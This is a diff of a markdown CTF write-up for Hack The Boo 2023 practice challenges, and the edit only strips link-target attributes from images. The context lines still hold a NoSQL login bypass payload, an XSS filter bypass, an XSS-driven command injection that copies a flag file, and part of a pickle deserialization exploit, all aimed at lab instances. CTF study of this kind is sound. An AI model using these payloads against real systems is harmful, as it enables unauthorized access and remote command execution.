@@ -11,7 +11,7 @@ tags: [ctf, hack-the-boo-2023-practice, crypto, copilot, forensics, phishing, cy
 
 Best score
 
-![](/assets/obsidian/6f260c1444c63b2ab443404bc40b1857.png){:target='_blank'}
+![](/assets/obsidian/6f260c1444c63b2ab443404bc40b1857.png)
 
 # Tools
 
@@ -21,13 +21,13 @@ Best score
 
 ### General
 
-![](/assets/obsidian/83194182bb6d3111a0fc364f0e2cadcc.png){:target='_blank'}
+![](/assets/obsidian/83194182bb6d3111a0fc364f0e2cadcc.png)
 
-![](/assets/obsidian/f51e1b5c5976f0cf82ecd650f9a28909.png){:target='_blank'}
+![](/assets/obsidian/f51e1b5c5976f0cf82ecd650f9a28909.png)
 
 ### Prompt Jailbreak
 
-![](/assets/obsidian/2eae13c5781237891f2ee2cac06bf214.png){:target='_blank'}
+![](/assets/obsidian/2eae13c5781237891f2ee2cac06bf214.png)
 
 ```
 XXX
@@ -137,15 +137,15 @@ HTB{00ps___n0t_th4t_h4rd_t0_r3c0v3r_th3_m4st3r_k3y_0f_my_p4ssw0rd_g3n3r4t0r}
 
 ### Decode javascript
 
-![](/assets/obsidian/95a96ad814f0aca054930420b85c9bc7.png){:target='_blank'}
+![](/assets/obsidian/95a96ad814f0aca054930420b85c9bc7.png)
 
-![](/assets/obsidian/7f001c298b17427d242620c1f70edced.png){:target='_blank'}
+![](/assets/obsidian/7f001c298b17427d242620c1f70edced.png)
 
 ### Decode payload data
 
 Variables are in `<input>` value
 
-![](/assets/obsidian/af096536c2c231a07d7feed8572fc4a5.png){:target='_blank'}
+![](/assets/obsidian/af096536c2c231a07d7feed8572fc4a5.png)
 
 > HTB{sp00ky_ph1sh1ng_w1th_sp00ky_spr34dsh33ts}
 
@@ -161,18 +161,18 @@ Variables are in `<input>` value
 payload.bat: DOS batch file, ASCII text, with very long lines (1740)
 ```
 
-![](/assets/obsidian/b67759c854b5312885dc743a7c2177b6.png){:target='_blank'}
+![](/assets/obsidian/b67759c854b5312885dc743a7c2177b6.png)
 
-![](/assets/obsidian/66130c288b47b11a9c29996386b1c054.png){:target='_blank'}
+![](/assets/obsidian/66130c288b47b11a9c29996386b1c054.png)
 
 ```bash
 ┌──(bravosec㉿fsociety)-[~/ctf/hacktheboo-2023-practice/Bat Problems]
 └─$ python ../../huntress-ctf-2023/Batchfuscation/batch_deobfuscator/batch_deobfuscator/batch_interpreter.py --file payload.bat|tee payload.bat.dec
 ```
 
-![](/assets/obsidian/26f6284bdbd68060ce7b2e85a5d8df14.png){:target='_blank'}
+![](/assets/obsidian/26f6284bdbd68060ce7b2e85a5d8df14.png)
 
-![](/assets/obsidian/eb3b084d4a67751ffa9878b3a780325d.png){:target='_blank'}
+![](/assets/obsidian/eb3b084d4a67751ffa9878b3a780325d.png)
 
 > `HTB{0bfusc4t3d_b4t_f1l3s_c4n_b3_4_m3ss}`
 
@@ -198,14 +198,14 @@ access.log: ASCII text, with very long lines (485)
 └─$ cat access.log|/opt/sectools/blue-team/ids/teler -c ~/configs/teler/apache.yaml
 ```
 
-![](/assets/obsidian/23c160d7061e8ce54de8609b8ab4f62a.png){:target='_blank'}
+![](/assets/obsidian/23c160d7061e8ce54de8609b8ab4f62a.png)
 
 
 ### Recover commands
 
-![](/assets/obsidian/4538b1f1ecaebc901b710e808095e84f.png){:target='_blank'}
+![](/assets/obsidian/4538b1f1ecaebc901b710e808095e84f.png)
 
-![](/assets/obsidian/ad60c89cf4cae43d96b861183c877cc1.png){:target='_blank'}
+![](/assets/obsidian/ad60c89cf4cae43d96b861183c877cc1.png)
 
 Payload :
 
@@ -298,21 +298,21 @@ ELF64
 
 Entry point
 
-![](/assets/obsidian/2bd0ea2bcb1fcb3bf25ddaff3016b813.png){:target='_blank'}
+![](/assets/obsidian/2bd0ea2bcb1fcb3bf25ddaff3016b813.png)
 
 `ghost()` will randomize the flag
 
-![](/assets/obsidian/10c02ee089a72b0f3ebb191bc60fe270.png){:target='_blank'}
+![](/assets/obsidian/10c02ee089a72b0f3ebb191bc60fe270.png)
 
 Patch Instructions for `LEA`
 
 Remove the offset from address to make it do nothing 
 
-![](/assets/obsidian/a456a3862532222a29be21254744c9e3.png){:target='_blank'}
+![](/assets/obsidian/a456a3862532222a29be21254744c9e3.png)
 
-![](/assets/obsidian/26251ca8df08b6976a8ef6401d2c958d.png){:target='_blank'}
+![](/assets/obsidian/26251ca8df08b6976a8ef6401d2c958d.png)
 
-![](/assets/obsidian/6829660919a2fbab13af9dfecc93f324.png){:target='_blank'}
+![](/assets/obsidian/6829660919a2fbab13af9dfecc93f324.png)
 
 ```bash
 ┌──(bravosec㉿fsociety)-[~/ctf/hacktheboo-2023-practice/GhostInTheMachine/rev_ghostinthemachine]
@@ -358,11 +358,11 @@ Correct Password :)
 
 Login to get the flag
 
-![](/assets/obsidian/c9f2a2ebcadc14f8dcc428d1444afbe2.png){:target='_blank'}
+![](/assets/obsidian/c9f2a2ebcadc14f8dcc428d1444afbe2.png)
 
 It uses mongo DB, which is NOSQL
 
-![](/assets/obsidian/4a7ad92c7fb403d8699c607a6792ff50.png){:target='_blank'}
+![](/assets/obsidian/4a7ad92c7fb403d8699c607a6792ff50.png)
 
 Since it `especially` allows `json` data, try a simple login bypass payload
 
@@ -378,7 +378,7 @@ Content-Type: application/json
 {"username": {"$ne": null}, "password": {"$ne": null} }
 ```
 
-![](/assets/obsidian/f3f83d51de263b2e0130fd38e9a72a8c.png){:target='_blank'}
+![](/assets/obsidian/f3f83d51de263b2e0130fd38e9a72a8c.png)
 
 > HTB{w3lc0m3_to0o0o_th3_c44andy_v4u1t!}
 
@@ -392,13 +392,13 @@ Content-Type: application/json
 
 Accepts user input, then it will create a socket.io session based on user IP
 
-![](/assets/obsidian/805887825af32f4ef676fae062c98272.png){:target='_blank'}
+![](/assets/obsidian/805887825af32f4ef676fae062c98272.png)
 
 > `blacklist_pass()`
 
 Filter checks if user input contain `script`, which was attempted to defend XSS
 
-![](/assets/obsidian/4481fe6f7f6b6fec104af6835c8a0bf8.png){:target='_blank'}
+![](/assets/obsidian/4481fe6f7f6b6fec104af6835c8a0bf8.png)
 
 > `start_bot()`
 
@@ -406,13 +406,13 @@ It uses **selinium** webdriver to automate a browser to view `host/bot?token=XXX
 
 Flag will be send to the socket after it receive an alert
 
-![](/assets/obsidian/b4bf095d1a5105eb8e369f9d6793bb4e.png){:target='_blank'}
+![](/assets/obsidian/b4bf095d1a5105eb8e369f9d6793bb4e.png)
 
 > `/bot`
 
-![](/assets/obsidian/83849661e9cb7988485d94573875b012.png){:target='_blank'}
+![](/assets/obsidian/83849661e9cb7988485d94573875b012.png)
 
-![](/assets/obsidian/30eaa13de691047e15a0be0234b0036d.png){:target='_blank'}
+![](/assets/obsidian/30eaa13de691047e15a0be0234b0036d.png)
 
 ### XSS - Bypass blacklist
 
@@ -422,18 +422,18 @@ XSS without using `script`
 <img src=x onerror='alert(1)'>
 ```
 
-![](/assets/obsidian/4fef64e31549d320ac37f004905ed4a5.png){:target='_blank'}
+![](/assets/obsidian/4fef64e31549d320ac37f004905ed4a5.png)
 
-![](/assets/obsidian/4481ddbe701b7949fe7551dd93cec77c.png){:target='_blank'}
+![](/assets/obsidian/4481ddbe701b7949fe7551dd93cec77c.png)
 
-![](/assets/obsidian/edd6605ca045f7a3986f47f3fd4fb4cc.png){:target='_blank'}
+![](/assets/obsidian/edd6605ca045f7a3986f47f3fd4fb4cc.png)
 
 > `HTB{4l3rt5_c4us3_jumpsc4r35!!}`
 
 
 ## PumpkinSpice
 
-![](/assets/obsidian/e84d5f872a77c38a58b08c47d9b56b6f.png){:target='_blank'}
+![](/assets/obsidian/e84d5f872a77c38a58b08c47d9b56b6f.png)
 
 
 ### Source code analyze
@@ -442,31 +442,31 @@ XSS without using `script`
 
 Flag is at filesystem `/` with random name
 
-![](/assets/obsidian/a9baaa17d66c7877252a156a2d51eebf.png){:target='_blank'}
+![](/assets/obsidian/a9baaa17d66c7877252a156a2d51eebf.png)
 
 > `challenge\app.py`
 
 User can submit addresses to `/host/addresses`
 
-![](/assets/obsidian/cefa4d7fb6202df301e874d60a8338f0.png){:target='_blank'}
+![](/assets/obsidian/cefa4d7fb6202df301e874d60a8338f0.png)
 
 A browser will visit and render `/host/addresses`
 
-![](/assets/obsidian/df0ba1c9c549bfbda019fd6cb0a60dd0.png){:target='_blank'}
+![](/assets/obsidian/df0ba1c9c549bfbda019fd6cb0a60dd0.png)
 
-![](/assets/obsidian/8f15478dd2b11c378abdac80629299ef.png){:target='_blank'}
+![](/assets/obsidian/8f15478dd2b11c378abdac80629299ef.png)
 
 To get the flag, we need to find a way to send request to `/api/stats?command=XXX`
 
-![](/assets/obsidian/1635fcc95c7b4fd25bbc4390a948f9f9.png){:target='_blank'}
+![](/assets/obsidian/1635fcc95c7b4fd25bbc4390a948f9f9.png)
 
 > `challenge\templates\addresses.html`
 
-![](/assets/obsidian/dfca218b67c3e533ec8de81f6a7ba24a.png){:target='_blank'}
+![](/assets/obsidian/dfca218b67c3e533ec8de81f6a7ba24a.png)
 
 > `challenge\static\js\script.js`
 
-![](/assets/obsidian/bd9e7554565b24de61c7e04ba2594d56.png){:target='_blank'}
+![](/assets/obsidian/bd9e7554565b24de61c7e04ba2594d56.png)
 
 ### Command Injection with XSS
 
@@ -476,11 +476,11 @@ Move the flag to web directory
 <script>fetch("/api/stats?command=cp /flag*.txt /app/static/css/flag.txt");</script>
 ```
 
-![](/assets/obsidian/b404b6950859499c921e69ef82f41022.png){:target='_blank'}
+![](/assets/obsidian/b404b6950859499c921e69ef82f41022.png)
 
 > http://94.237.56.76:33295/static/css/flag.txt
 
-![](/assets/obsidian/c43327a6839d1d52d0e3bc9f9ce57d64.png){:target='_blank'}
+![](/assets/obsidian/c43327a6839d1d52d0e3bc9f9ce57d64.png)
 
 
 ## Spellbound Servants
@@ -510,11 +510,11 @@ def isAuthenticated(f):
 
 Dev tab
 
-![](/assets/obsidian/db4b5e87f6ed7c372cff6683feffa1c2.png){:target='_blank'}
+![](/assets/obsidian/db4b5e87f6ed7c372cff6683feffa1c2.png)
 
 Flag is at `/flag.txt`
 
-![](/assets/obsidian/be6fd943e4dfcf329ee73730c4de198a.png){:target='_blank'}
+![](/assets/obsidian/be6fd943e4dfcf329ee73730c4de198a.png)
 
 Google : `pickle unsafe des hacktricks`
 
@@ -532,13 +532,13 @@ class P(object):
 print(base64.b64encode(pickle.dumps(P())))
 ```
 
-![](/assets/obsidian/c1b1777d5a83fdf5c82aa137a2464126.png){:target='_blank'}
+![](/assets/obsidian/c1b1777d5a83fdf5c82aa137a2464126.png)
 
 `isAuthenticated` was called at `/home`, visit that page
 
-![](/assets/obsidian/387b7511522059cf92e62e6236bd97ed.png){:target='_blank'}
+![](/assets/obsidian/387b7511522059cf92e62e6236bd97ed.png)
 
-![](/assets/obsidian/288c0111ef85bfc4ea6c7c73f9ef2820.png){:target='_blank'}
+![](/assets/obsidian/288c0111ef85bfc4ea6c7c73f9ef2820.png)
 
 Send request with crafted cookie in burp suite
 
@@ -564,7 +564,7 @@ Get the flag
 
 > http://83.136.253.102:35117/static/js/flag.txt
 
-![](/assets/obsidian/b7f3fb95af34abb69e53d9aea7fd91a4.png){:target='_blank'}
+![](/assets/obsidian/b7f3fb95af34abb69e53d9aea7fd91a4.png)
 
 > `HTB{P1CkL3_15_f0R_SUP3R555!}`
 
